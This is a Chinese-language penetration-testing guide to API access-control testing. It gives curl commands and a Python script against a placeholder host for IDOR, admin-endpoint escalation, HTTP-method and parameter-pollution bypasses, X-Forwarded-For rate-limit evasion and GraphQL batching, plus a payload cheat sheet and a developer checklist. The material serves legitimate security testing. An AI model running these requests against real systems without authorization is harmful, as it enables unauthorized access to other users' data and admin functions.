# API 权限测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的

为渗透测试人员提供一套标准化的 API 权限测试流程，确保能够系统性地发现 API 接口中的访问控制缺陷，包括未授权访问、权限绕过、水平/垂直权限提升等漏洞。

## 1.2 适用范围

本文档适用于以下场景：
- RESTful API 架构的 Web 应用
- GraphQL API 接口
- 微服务架构中的服务间 API 调用
- 移动应用后端 API
- 前后端分离架构中的 API 接口

## 1.3 读者对象

- 执行 API 安全测试的渗透测试人员
- 进行 API 代码审计的安全分析师
- 负责 API 安全开发的开发人员

---

# 第二部分：核心渗透技术专题

## 专题一：API 权限测试

### 2.1 技术介绍

API 权限测试是指对应用程序编程接口（API）的访问控制机制进行系统性测试，验证 API 端点是否正确实施了权限验证和授权检查。

**核心问题：**
- API 端点是否正确验证了调用者的身份
- 用户是否只能访问其权限范围内的资源
- API 是否存在越权访问的风险

**API 权限漏洞本质：**
1. **身份验证缺失** - API 端点未检查认证令牌
2. **授权检查缺失** - 未验证用户是否有权执行该操作
3. **对象引用不安全** - 通过修改资源 ID 可访问他人数据
4. **HTTP 方法绕过** - 通过更改请求方法绕过权限检查

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
| :--- | :--- | :--- |
| **用户数据管理** | `/api/users/{id}`、`/api/profile` | 修改用户 ID 可访问他人信息 |
| **订单/交易处理** | `/api/orders/{id}`、`/api/transactions` | 越权查看或修改他人订单 |
| **文件资源访问** | `/api/files/{id}`、`/api/documents` | 未授权访问敏感文档 |
| **管理功能接口** | `/api/admin/users`、`/api/admin/config` | 普通用户可调用管理员接口 |
| **批量操作接口** | `/api/batch/delete`、`/api/batch/update` | 批量操作中权限检查缺失 |
| **数据导出接口** | `/api/export/users`、`/api/report` | 未授权导出敏感数据 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：API 端点枚举**
- 使用工具扫描 API 端点（如 Burp Suite、Postman、OWASP ZAP）
- 分析前端代码中的 API 调用
- 查阅 API 文档（Swagger/OpenAPI）
- 使用目录爆破工具（如 gobuster、dirb）

**步骤二：权限矩阵绘制**
```
用户角色          | 资源 A | 资源 B | 管理接口 | 敏感操作
-----------------|--------|--------|----------|----------
未认证用户        |   ×    |   ×    |    ×     |    ×
普通用户 (User1)  |   ✓    |   ×    |    ×     |    ×
普通用户 (User2)  |   ×    |   ✓    |    ×     |    ×
管理员用户        |   ✓    |   ✓    |    ✓     |    ✓
```

**步骤三：未授权访问测试**
```bash
# 1. 无认证令牌访问
curl https://target.com/api/users/123

# 2. 使用过期/无效令牌
curl -H "Authorization: Bearer expired_token" https://target.com/api/users/123

# 3. 移除认证头
curl -H "Authorization:" https://target.com/api/users/123
```

**步骤四：水平权限提升测试（IDOR）**
```bash
# 使用 User1 的令牌访问 User2 的资源
curl -H "Authorization: Bearer user1_token" \
     https://target.com/api/users/456

# 遍历资源 ID
for i in {1..100}; do
  curl -H "Authorization: Bearer user1_token" \
       https://target.com/api/users/$i
done
```

**步骤五：垂直权限提升测试**
```bash
# 普通用户访问管理员接口
curl -H "Authorization: Bearer normal_user_token" \
     https://target.com/api/admin/users

# 尝试访问不同 HTTP 方法
curl -X POST -H "Authorization: Bearer normal_user_token" \
     https://target.com/api/admin/delete-user
```

#### 2.3.2 白盒测试

**代码审计要点：**
1. 检查每个 API 端点是否有认证中间件
2. 检查权限验证逻辑是否在业务逻辑之前执行
3. 检查资源所有权验证是否正确实现
4. 检查是否有统一的权限控制框架

**示例（Node.js/Express）：**
```javascript
// ❌ 不安全 - 缺少权限检查
app.get('/api/users/:id', (req, res) => {
  const user = db.getUser(req.params.id);
  res.json(user);
});

// ✅ 安全 - 添加权限检查
app.get('/api/users/:id', authMiddleware, (req, res) => {
  const user = db.getUser(req.params.id);
  if (user.id !== req.user.id && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  res.json(user);
});
```

### 2.4 漏洞利用方法

#### 2.4.1 基础信息收集

| **测试目标** | **API 端点示例** | **说明** |
| :--- | :--- | :--- |
| 用户列表枚举 | `GET /api/users` | 获取所有用户信息 |
| 角色权限信息 | `GET /api/roles`、`GET /api/permissions` | 了解权限模型 |
| API 版本信息 | `GET /api/version`、`GET /api/config` | 识别技术栈 |
| 敏感配置信息 | `GET /api/config`、`GET /api/settings` | 获取系统配置 |

#### 2.4.2 数据越权访问

```bash
# 1. 批量获取用户数据
curl -H "Authorization: Bearer victim_token" \
     "https://target.com/api/users?limit=1000"

# 2. 访问关联资源
curl -H "Authorization: Bearer user1_token" \
     "https://target.com/api/users/456/orders"

# 3. 搜索功能滥用
curl -H "Authorization: Bearer user1_token" \
     "https://target.com/api/users/search?q=admin"
```

#### 2.4.3 权限绕过利用

**HTTP 方法绕过：**
```bash
# 原本只有 DELETE 权限受限，但 GET/POST 可能未限制
curl -X GET -H "Authorization: Bearer normal_token" \
     https://target.com/api/admin/delete-user?id=123

curl -X POST -H "Authorization: Bearer normal_token" \
     -d "id=123" https://target.com/api/admin/delete-user
```

**参数污染绕过：**
```bash
# 利用数组参数绕过单个 ID 的权限检查
curl -H "Authorization: Bearer user1_token" \
     "https://target.com/api/users?id=123&id=456"

# 利用 JSON 参数
curl -H "Authorization: Bearer user1_token" \
     -H "Content-Type: application/json" \
     -d '{"userId": [123, 456, 789]}' \
     https://target.com/api/users/batch
```

#### 2.4.4 自动化测试脚本

```python
#!/usr/bin/env python3
"""API 权限自动化测试脚本"""

import requests
from itertools import product

class APIPermissionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.sessions = {}  # 存储不同角色的会话
    
    def add_role(self, role_name, token):
        """添加一个角色的认证令牌"""
        self.sessions[role_name] = {
            'Authorization': f'Bearer {token}'
        }
    
    def test_horizontal_escalation(self, endpoint, user_id_param, 
                                    attacker_role, victim_id):
        """测试水平权限提升"""
        headers = self.sessions.get(attacker_role, {})
        url = f"{endpoint}/{victim_id}"
        
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            print(f"[+] 水平权限提升成功：{attacker_role} 可访问用户 {victim_id}")
            return True
        return False
    
    def test_vertical_escalation(self, admin_endpoints, normal_role):
        """测试垂直权限提升"""
        headers = self.sessions.get(normal_role, {})
        
        for endpoint in admin_endpoints:
            response = requests.get(f"{self.base_url}{endpoint}", 
                                   headers=headers)
            if response.status_code == 200:
                print(f"[+] 垂直权限提升成功：{normal_role} 可访问 {endpoint}")

# 使用示例
tester = APIPermissionTester("https://target.com")
tester.add_role("user1", "user1_token_here")
tester.add_role("user2", "user2_token_here")
tester.add_role("admin", "admin_token_here")

# 测试水平权限提升
tester.test_horizontal_escalation("/api/users", "id", "user1", 456)

# 测试垂直权限提升
admin_endpoints = ["/api/admin/users", "/api/admin/config"]
tester.test_vertical_escalation(admin_endpoints, "user1")
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 API 速率限制

```bash
# 1. 使用不同 IP（X-Forwarded-For 头）
for i in {1..100}; do
  curl -H "X-Forwarded-For: 10.0.0.$i" \
       -H "Authorization: Bearer token" \
       https://target.com/api/sensitive-endpoint
done

# 2. 利用多个子域名/路径
https://api1.target.com/endpoint
https://api2.target.com/endpoint

# 3. 请求方法变换
POST /api/endpoint
PUT /api/endpoint
PATCH /api/endpoint
```

#### 2.5.2 绕过 API 版本控制

```bash
# 尝试不同 API 版本
https://target.com/api/v1/admin/users
https://target.com/api/v2/admin/users
https://target.com/api/v3/admin/users

# 旧版本可能存在已修复的漏洞
curl -H "Authorization: Bearer normal_token" \
     https://target.com/api/v1/admin/users
```

#### 2.5.3 绕过内容类型检查

```bash
# 尝试不同的 Content-Type
curl -H "Content-Type: application/json" \
     -H "Authorization: Bearer token" \
     -d '{"id": 123}' \
     https://target.com/api/users

curl -H "Content-Type: application/xml" \
     -H "Authorization: Bearer token" \
     -d '<user><id>123</id></user>' \
     https://target.com/api/users

curl -H "Content-Type: application/x-www-form-urlencoded" \
     -H "Authorization: Bearer token" \
     -d "id=123" \
     https://target.com/api/users
```

#### 2.5.4 利用 GraphQL 进行权限探测

```graphql
# 内省查询获取所有可用字段和类型
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

# 批量查询绕过单个查询的权限检查
{
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
}
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| **类别** | **测试目标** | **Payload 示例** | **说明** |
| :--- | :--- | :--- | :--- |
| **未授权访问** | 无令牌访问 | `curl https://target.com/api/users` | 测试是否需要认证 |
| **未授权访问** | 无效令牌 | `curl -H "Authorization: Bearer invalid" https://target.com/api/users` | 测试令牌验证 |
| **水平越权** | IDOR 测试 | `curl -H "Auth: Bearer user1" https://target.com/api/users/456` | 访问他人资源 |
| **垂直越权** | 管理员接口 | `curl -H "Auth: Bearer user" https://target.com/api/admin/users` | 访问管理功能 |
| **HTTP 方法绕过** | 方法变换 | `curl -X POST https://target.com/api/admin/delete?id=1` | 尝试不同方法 |
| **参数污染** | 数组参数 | `curl https://target.com/api/users?id=1&id=2&id=3` | 批量获取数据 |
| **路径遍历** | 上级目录 | `curl https://target.com/api/../admin/users` | 路径绕过 |
| **版本绕过** | 旧版本 API | `curl https://target.com/api/v1/admin/users` | 测试旧版本 |

## 3.2 API 权限测试检查清单

### 认证检查
- [ ] 所有 API 端点是否要求认证
- [ ] 令牌是否经过正确验证
- [ ] 过期/撤销的令牌是否被拒绝
- [ ] 令牌是否与服务端会话绑定

### 授权检查
- [ ] 每个操作是否检查用户权限
- [ ] 资源访问是否验证所有权
- [ ] 管理员功能是否限制访问
- [ ] 批量操作是否逐项检查权限

### 输入验证
- [ ] 资源 ID 参数是否经过验证
- [ ] 分页参数是否有限制
- [ ] 排序字段是否白名单控制
- [ ] 搜索查询是否经过过滤

### 速率限制
- [ ] 是否有请求频率限制
- [ ] 限制是否基于用户/IP
- [ ] 是否有防暴力破解机制
- [ ] 错误响应是否泄露敏感信息

## 3.3 常用测试工具

| **工具名称** | **用途** | **命令示例** |
| :--- | :--- | :--- |
| **Burp Suite** | API 拦截和修改 | 使用 Repeater 手动测试 |
| **Postman** | API 请求构造 | 创建 Collection 批量测试 |
| **OWASP ZAP** | API 扫描 | `zap-cli quick-scan --spider -r https://target.com/api` |
| **curl** | 命令行测试 | `curl -H "Authorization: Bearer token" https://target.com/api` |
| **httpie** | 简化 HTTP 测试 | `http GET https://target.com/api/users Authorization:"Bearer token"` |
| **Arjun** | 参数发现 | `arjun -u https://target.com/api/users` |
| **Kiterunner** | API 路由枚举 | `kr https://target.com -w api-routes.txt` |

---

## 参考资源

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [OWASP Testing Guide - API Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger - API Testing](https://portswigger.net/burp/documentation/desktop/testing-workflow/api-testing)
- [REST API Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)
